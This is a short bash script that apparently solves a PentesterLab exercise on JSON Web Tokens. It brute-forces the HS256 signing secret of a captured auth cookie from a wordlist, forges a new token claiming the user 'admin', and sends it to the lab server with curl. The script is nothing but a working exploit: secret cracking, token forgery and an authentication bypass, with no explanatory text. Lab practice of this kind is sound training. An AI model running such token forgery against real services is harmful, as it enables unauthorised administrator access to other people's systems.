#!/bin/bash

# try a request with the original auth cookie
curl -i -k -X GET -b "auth=$(cat token.txt)" 'http://ptl-4cd0ce7b-2e22fd9a.libcurl.so/'

# bruteforce the key from the original token
cut -d '.' -f 1,2 < token.txt | perl -pe 's#\n##' > data.txt
cat wordlist.txt | xargs -I{} python sign.py {}

# craft a new token for the admin
echo -n '{"typ":"JWT","alg":"HS256"}' | basenc --base64url -w 0 > data.txt
echo -n '{"user":"admin"}' | basenc --base64url -w 0 | (echo -n '.' && cat) >> data.txt
perl -pi -e 's#=##g' data.txt
python sign.py pentesterlab | (echo -n '.' && cat) | cat data.txt - > token.evil.txt

# send to the server
curl -i -k -X GET -b "auth=$(cat token.evil.txt)" 'http://ptl-4cd0ce7b-2e22fd9a.libcurl.so/'
